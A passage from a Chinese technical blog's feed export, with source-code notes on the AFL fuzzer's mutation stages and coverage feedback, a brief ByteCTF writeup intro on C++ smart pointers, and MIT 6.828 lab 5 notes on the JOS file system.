*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  doing_det = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>第一阶段的<code>Bitflip</code> 也就是 <code>bitflip 1/1</code>  ，可以看到 <code>stage_max = len &lt;&lt; 3;</code>  然后进行了<code>stage_max</code>次数的循环，也就是每字节会做8次bitflip，逐个字节逐个比特进行反转。</p>
<p>反转后调用<code>common_fuzz_stuff</code>  函数，进行fuzz，fuzz过后再次把比特反转回复过来。</p>
<p>在这个阶段还实现了采集<code>token</code>的功能。即如果连续几个字节，反转其最后一个比特后其执行路径相同，且与初始路径不同。那么这连续的几个字节很大概率是有特殊语义的<code>token</code> ，属于关键字性质的。</p>
<p>例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">........IHDR........</span><br></pre></td></tr></table></figure>

<p>当翻转到字符<code>I</code>的最高位时，因为<code>IHDR</code>被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，<code>IHDR</code>标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：<code>IHDR</code>，并将其记录下来为后面的变异提供备选。</p>
<p>AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在<code>config.h</code>中通过宏定义了限制：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Length limits for auto-detected dictionary tokens: */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_AUTO_EXTRA 3 #<span class="meta-keyword">define</span> MAX_AUTO_EXTRA 32 </span></span><br><span class="line"><span class="comment">/* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USE_AUTO_EXTRAS 10 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10)</span></span><br></pre></td></tr></table></figure>

<p>对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改MAX_AUTO_EXTRA为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*********************************************</span></span><br><span class="line"><span class="comment">   * SIMPLE BITFLIP (+dictionary construction) *</span></span><br><span class="line"><span class="comment">   *********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line">    u8* _arf = (u8*)(_ar); \</span><br><span class="line">    u32 _bf = (_b); \</span><br><span class="line">    _arf[(_bf) &gt;&gt; <span class="number">3</span>] ^= (<span class="number">128</span> &gt;&gt; ((_bf) &amp; <span class="number">7</span>)); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Single walking bit. */</span></span><br><span class="line"></span><br><span class="line">  stage_short = <span class="string">"flip1"</span>;</span><br><span class="line">  stage_max   = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  stage_name  = <span class="string">"bitflip 1/1"</span>;</span><br><span class="line"></span><br><span class="line">  stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  prev_cksum = queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While flipping the least significant bit in every byte, pull of an extra</span></span><br><span class="line"><span class="comment">       trick to detect possible syntax tokens. In essence, the idea is that if</span></span><br><span class="line"><span class="comment">       you have a binary blob like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       xxxxxxxxIHDRxxxxxxxx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...and changing the leading and trailing bytes causes variable or no</span></span><br><span class="line"><span class="comment">       changes in program flow, but touching any character in the "IHDR" string</span></span><br><span class="line"><span class="comment">       always produces the same, distinctive path, it's highly likely that</span></span><br><span class="line"><span class="comment">       "IHDR" is an atomically-checked magic value of special significance to</span></span><br><span class="line"><span class="comment">       the fuzzed format.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We do this here, rather than as a separate stage, because it's a nice</span></span><br><span class="line"><span class="comment">       way to keep the operation approximately "free" (i.e., no extra execs).</span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment">       Empirically, performing the check when flipping the least significant bit</span></span><br><span class="line"><span class="comment">       is advantageous, compared to doing it at the time of more disruptive</span></span><br><span class="line"><span class="comment">       changes, where the program flow may be affected in more violent ways.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The caveat is that we won't generate dictionaries in the -d mode or -S</span></span><br><span class="line"><span class="comment">       mode - but that's probably a fair trade-off.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       This won't work particularly well with paths that exhibit variable</span></span><br><span class="line"><span class="comment">       behavior, but fails gracefully, so we'll carry out the checks anyway.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">      u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">           final character and force output. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        a_len++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">           worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">        a_len = <span class="number">0</span>;</span><br><span class="line">        prev_cksum = cksum;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Continue collecting string, but only if the bit flip actually made</span></span><br><span class="line"><span class="comment">         any difference - we don't want no-op tokens. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];        </span><br><span class="line">        a_len++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  stage_finds[STAGE_FLIP1]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_FLIP1] += stage_max;</span><br></pre></td></tr></table></figure>

<p>后面跟着的就是2比特2比特的逐个翻转，4比特4比特位移是1位的逐个翻转，然后是1字节1字节的翻转等等等。。。。总之是长度不一，步长不同的比特反转。</p>
<p>在进行<code>bitflip 8/8变异</code>时，AFL还生成了一个非常重要的信息：<code>effector map</code>。这个effector map几乎贯穿了整个<code>deterministic</code> <code>fuzzing</code>的始终。</p>
<p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</p>
<p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”<code>data</code>”，而非”<code>metadata</code>”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考<code>effector</code> <code>map</code>，跳过那些“无效”的byte，从而节省了执行资源。</p>
<p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</p>
<p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Minimum input file length at which the effector logic kicks in: */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_MIN_LEN 128 </span></span><br><span class="line"><span class="comment">/* Maximum effector density past which everything is just fuzzed unconditionally (%): */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_MAX_PERC 90</span></span><br></pre></td></tr></table></figure>

<p>即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。</p>
<p>后面仍有arithmetic，interest，dictionary，havoc，splice，cycle等变异手段。具体可以参考<a href="https://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">https://rk700.github.io/2018/01/04/afl-mutations/</a>  此处不再赘述。</p>
<p>总而言之，AFL的变异策略既有逐位变异的运气成分，同时也合理运用了覆盖率反馈的信息来启发性的创造<code>token</code> 和 <code>effort map</code> 等概念，帮助算法更好的进行变异。</p>
<h3 id="3-2-save-if-interesting"><a href="#3-2-save-if-interesting" class="headerlink" title="3.2 save_if_interesting"></a>3.2 save_if_interesting</h3><p>覆盖率反馈信息除了一定程度上可以启发性的指导变异以外，最大作用就是在这个函数内实现的选种功能。</p>
<p>如果这个has_new_bits返回为0的话，那么该函数直接返回0，程序继续进行下一次的fuzz。但是如果发现了新的cov信息或者bb信息，那么就会将产生新路径的testcase保存为新的种子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(hnb = has_new_bits(virgin_bits))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (crash_mode) total_crashes++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代表<code>current</code> 是刚刚返回的覆盖率信息,<code>virgin_map</code>是当前我们的覆盖率状态。可以注意到<code>virgin_map</code>在<code>setup_shm</code>过程中被初始化成了全 <code>1</code> ,  代表<code>current</code>的<code>trace_bits</code> 初始化状态是全0的状态。根据插桩部分的逻辑，每有新的覆盖率信息，会在相应的<code>trace_bits</code>索引位置加一。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br></pre></td></tr></table></figure>

<p>每个<code>trace_bits</code>对应索引里的值其实就代表着走到这条路径的次数，当第<code>1，4，8，128</code>次走到这条路径时，<code>current</code>里的值就是<code>0</code>，而<code>virgin_map</code>里的值则是<code>ff</code>，此时函数将返回2<code>。</code>其余情况都会返回<code>1</code>。最后将<code>current</code>里的值取反，然后与<code>vrigin</code>相与，更新<code>virgin</code>的状态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if the current execution path brings anything new to the table.</span></span><br><span class="line"><span class="comment">   Update virgin bits to reflect the finds. Returns 1 if the only change is</span></span><br><span class="line"><span class="comment">   the hit-count for a particular tuple; 2 if there are new tuples seen. </span></span><br><span class="line"><span class="comment">   Updates the map, so subsequent calls will always return 0.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is called after every exec() on a fairly large buffer, so</span></span><br><span class="line"><span class="comment">   it needs to be fast. We do this in 32-bit and 64-bit flavors. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8* virgin_map)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">  u64* current = (u64*)trace_bits;</span><br><span class="line">  u64* virgin  = (u64*)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  u32* current = (u32*)trace_bits;</span><br><span class="line">  u32* virgin  = (u32*)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">  u8   ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap</span></span><br><span class="line"><span class="comment">       that have not been already cleared from the virgin map - since this will</span></span><br><span class="line"><span class="comment">       almost always be the case. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (likely(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        u8* cur = (u8*)current;</span><br><span class="line">        u8* vir = (u8*)virgin;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span></span><br><span class="line"><span class="comment">           bytes in current[] are pristine in virgin[]. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      *virgin &amp;= ~*current;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current++;</span><br><span class="line">    virgin++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits) bitmap_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>AFL源码分析（I）——白盒模式下的afl-gcc分析 - 安全客，安全资讯平台 (<a href="http://anquanke.com/" target="_blank" rel="noopener">anquanke.com</a>)</p>
<p>[AFL内部实现细节小记](</p>
]]></content>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCtf writeup</title>
    <url>/year/10/17/cl7iordmf0007293fug8khh1e/</url>
    <content><![CDATA[<p>这个题主要是熟悉一下智能指针的使用，以及可能会出现的相关漏洞</p>
<a id="more"></a>

<p>智能指针的原理是，接受一个申请好的内存地址，构造一个保存在栈上的智能指针对象，当程序退出栈的作用域范围后，由于栈上的变量自动被销毁，智能指针内部保存的内存也就被释放掉了（除非将智能指针保存起来）。</p>
<p>　　C++11提供了三种智能指针：std::shared_ptr, std::unique_ptr, std::weak_ptr，使用时需添加头文件 <memory>。</memory></p>
<p>　　shared_ptr使用引用计数，每一个shared_ptr的拷贝都指向相同的内存。每使用他一次，内部的引用计数加1，每析构一次，内部的引用计数减1，减为0时，删除所指向的堆内存。shared_ptr内部的引用计数是安全的，但是对象的读取需要加锁。</p>
<h2 id="bytezoom"><a href="#bytezoom" class="headerlink" title="bytezoom"></a>bytezoom</h2>]]></content>
  </entry>
  <entry>
    <title>MIT6.828 lab5</title>
    <url>/year/10/17/cl7iordoz0015293fl588t5we/</url>
    <content><![CDATA[<p>关于文件系统的lab</p>
<a id="more"></a>

<h2 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h2><p>我们要完成一个相对简单的文件系统，其可以实现创建、读、写以及删除在分层目录结构中组织的文件。目前我们的OS只支持单用户，因此我们的文件系统也不支持UNIX文件拥有或权限的概念。同时也不支持硬链接、符号链接、时间戳或是特别的设备文件。</p>
<h2 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h2><p>大多是 Unix 文件系统将磁盘空间分为 inode和数据 区域。目录包含文件名和指向inode的指针; 如果文件系统中的多个目录引用该文件的inode，则称文件是硬链接的。由于我们的文件系统不需要支持硬链接，因此我们不需要这一间接层并且能做一个方便的简化：我们的文件系统根本不使用inode，相反我们仅仅将所有文件(或子目录)的 meta-data存储在描述该文件的唯一的目录中(directory entry)。 文件和目录逻辑上都是由一系列数据blocks组成，这些blocks分散在磁盘中，文件系统屏蔽blocks分布的细节，提供一个可以顺序读写文件的接口。</p>
<h2 id="补充-inode"><a href="#补充-inode" class="headerlink" title="补充 inode"></a>补充 <code>inode</code></h2><p>操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。</p>
<p><strong>文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做*inode*，中文译名为”*索引节点*“。 具体包括以下内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 文件的字节数</span><br><span class="line"></span><br><span class="line">　　* 文件拥有者的User ID</span><br><span class="line"></span><br><span class="line">　　* 文件的Group ID</span><br><span class="line"></span><br><span class="line">　　* 文件的读、写、执行权限</span><br><span class="line"></span><br><span class="line">　　* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</span><br><span class="line"></span><br><span class="line">　　* 链接数，即有多少文件名指向这个inode</span><br><span class="line"></span><br><span class="line">　　* 文件数据block的位置</span><br></pre></td></tr></table></figure>

<p><strong>每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。</strong></p>
<p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p>
<p>这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p>
<p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：<strong>首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</strong></p>
<h2 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h2><p>大部分磁盘都是以Sector为粒度进行读写，JOS中Sectors为512字节。文件系统以block为单位分配和使用磁盘。注意区别，<code>sector</code> <code>size</code>是磁盘的属性，<code>block</code> <code>size</code>是操作系统使用磁盘的粒度。JOS的文件系统的block size被定为4096字节 ( 4kB ) 。</p>
<h2 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h2><p>我们的文件系统使用一个superblock，<strong>位于磁盘的block 1。block 0被用来保存boot loader和分区表。</strong></p>
<p>我们的文件系统使用一个superblock，<strong>位于磁盘的block 1。block 0被用来保存boot loader和分区表。</strong></p>
<p><img src="https://pic.imgdb.cn/item/616bf1282ab3f51d91a140bc.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_magic;        <span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_nblocks;        <span class="comment">// Total number of blocks on disk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span>        <span class="comment">// Root directory node</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h2><p>我们的文件系统使用struct File结构描述文件，该结构包含文件名，大小，类型，保存文件内容的block号。struct File结构的f_direct数组保存前NDIRECT（10）个block号，这样对于10*4096=40KB的文件不需要额外的空间来记录内容block号。对于更大的文件我们分配一个额外的block来保存4096/4=1024 block号。</p>
<p><img src="https://pic.imgdb.cn/item/616bf1bf2ab3f51d91a1d54d.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inc/fs.h</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> f_name[MAXNAMELEN];    <span class="comment">// filename</span></span><br><span class="line">    <span class="keyword">off_t</span> f_size;           <span class="comment">// file size in bytes</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_type;        <span class="comment">// file type</span></span><br><span class="line">    <span class="comment">// Block pointers.</span></span><br><span class="line">    <span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_direct[NDIRECT]; <span class="comment">// direct blocks</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_indirect;        <span class="comment">// indirect block</span></span><br><span class="line">    <span class="comment">// Pad out to 256 bytes; must do arithmetic in case we're compiling</span></span><br><span class="line">    <span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line">    <span class="keyword">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">&#125; __attribute__((packed));  <span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></table></figure>

<h2 id="Directories-versus-Regular-Files"><a href="#Directories-versus-Regular-Files" class="headerlink" title="Directories versus Regular Files"></a>Directories versus Regular Files</h2><p>File结构既能代表文件也能代表目录，由type字段区分，文件系统以相同的方式管理文件和目录，只是目录文件的内容是一系列File结构，这些File结构描述了在该目录下的文件或者子目录。超级块中包含一个File结构，代表文件系统的根目录。</p>
<h2 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h2><p>我们的文件系统最大支持3GB，文件系统进程保留从0x10000000 (DISKMAP)到0xD0000000 (DISKMAP+DISKMAX)固定3GB的内存空间作为磁盘的缓存。比如block 0被映射到虚拟地址0x10000000，block 1被映射到虚拟地址0x10001000以此类推。</p>
<p>由于我们的文件系统有独立于系统中其他环境的虚拟地址空间（不重叠），因为我们的文件系统唯一需要做的事是实现文件的 access。如此看来我们为文件系统保留大量的空间也是十分合理的。</p>
<p>如果将整个磁盘全部读到内存将非常耗时，所以我们将实现按需加载，只有当访问某个block对应的内存地址时出现页错误，才将该block从磁盘加载到对应的内存区域，然后重新执行内存访问指令。</p>
<h2 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h2><p>到目前为止，文件系统进程已经能提供各种操作文件的功能了，但是其他用户进程不能直接调用这些函数。我们通过进程间函数调用(RPC)对其它进程提供文件系统服务。RPC机制原理如下：</p>
<ul>
<li><p>RPC（Remote Procedure Call ）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Regular env           FS env</span><br><span class="line">   +---------------+   +---------------+</span><br><span class="line">   |      read     |   |   file_read   |</span><br><span class="line">   |   (lib/fd.c)  |   |   (fs/fs.c)   |</span><br><span class="line">...|.......|.......|...|.......^.......|...............</span><br><span class="line">   |       v       |   |       |       | RPC mechanism</span><br><span class="line">   |  devfile_read |   |  serve_read   |</span><br><span class="line">   |  (lib/file.c) |   |  (fs/serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |     fsipc     |   |     serve     |</span><br><span class="line">   |  (lib/file.c) |   |  (fs/serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |   ipc_send    |   |   ipc_recv    |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   +-------|-------+   +-------|-------+</span><br><span class="line">           |                   |</span><br><span class="line">           +-------------------+</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>本质上RPC还是借助IPC机制实现的。</p>
<p>在开始时，<code>read</code>只需调度到适当的设备读取函数，就可以适用于任何文件描述符，在本例中为devfile_read（我们可以有更多的设备类型，如管道）。 devfile_read专门为磁盘文件实现读取。 这个和lib / file.c中的其他devfile_ *函数实现了FS操作的客户端，并且所有工作都以大致相同的方式工作，在请求结构体中捆绑参数，调用fsipc发送IPC请求，以及解包和返回 结果。 fsipc函数只处理向服务器发送请求和接收回复的常见细节。</p>
<p>相关数据结构之间的关系可用下图来表示：</p>
<p><img src="https://pic.imgdb.cn/item/616bf2c12ab3f51d91a2aea4.png" alt></p>
<h2 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h2><p>通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。</p>
<h2 id="总结回顾"><a href="#总结回顾" class="headerlink" title="总结回顾"></a>总结回顾</h2><ol>
<li><p>通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。</p>
<ol>
<li><p>引入一个<code>文件系统进程</code>的特殊进程，该进程提供文件操作的接口。具体实现在fs/bc.c，fs/fs.c，fs/serv.c中。</p>
</li>
